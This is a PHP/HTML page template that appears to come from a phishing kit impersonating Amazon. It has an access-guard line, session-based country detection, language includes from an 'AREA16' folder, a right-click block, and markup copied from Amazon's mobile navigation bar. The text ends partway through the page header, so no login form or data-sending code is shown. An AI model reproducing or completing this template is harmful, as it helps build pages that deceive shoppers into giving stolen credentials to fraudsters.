<?php 
defined("ACCESS") or die('Konz');

$country=trim($_SESSION['countryCode']);
include FCPATH. "AREA16/system/language/lang.php";
?>
<!DOCTYPE html>
	<html>
	<head>
		<title>
			<?php echo $_45 ?>
		</title>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<link rel="shortcut icon" href="<?=base_url()?>AREA16/assets/images/favicon.ico" />
		<link rel="stylesheet" type="text/css" href="<?=base_url()?>AREA16/assets/css/boostrap.min.css" media="all">
		<link rel="stylesheet" type="text/css" href="<?=base_url()?>AREA16/assets/css/style.css" media="all">
		<link rel="stylesheet" type="text/css" href="<?=base_url()?>AREA16/assets/css/main.css" media="all">
	</head>
	<body onload="_loader()" style="margin:0;" oncontextmenu="return false;">
		<div id="loader"></div>
		<div style="display:none;" id="myDiv" class="animate-bon ttom">
			<div class="a-section a-spacing-none">
				<header id="nav-main" data-nav-language="en_US" class="nav-mobile nav-progressive-attribute nav-locale-us nav-lang-en nav-ssl nav-unrec nav-blueheaven">
					<div id="navbar" role="navigation" class="nav-t-basicNoAuth nav-sprite-v3 celwidget">
						<div id="nav-logobar">
							<div class="nav-left">
								<div id="nav-logo">
									<a id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute" aria-label="Amazon"> <span class="nav-sprite nav-logo-base"></span> <span id="logo-ext" class="nav-sprite nav-logo-ext nav-progressive-content"></span> <span class="nav-logo-locale"></span> </a>
								</div>
							</div>
						</div>
					</div>
				</header>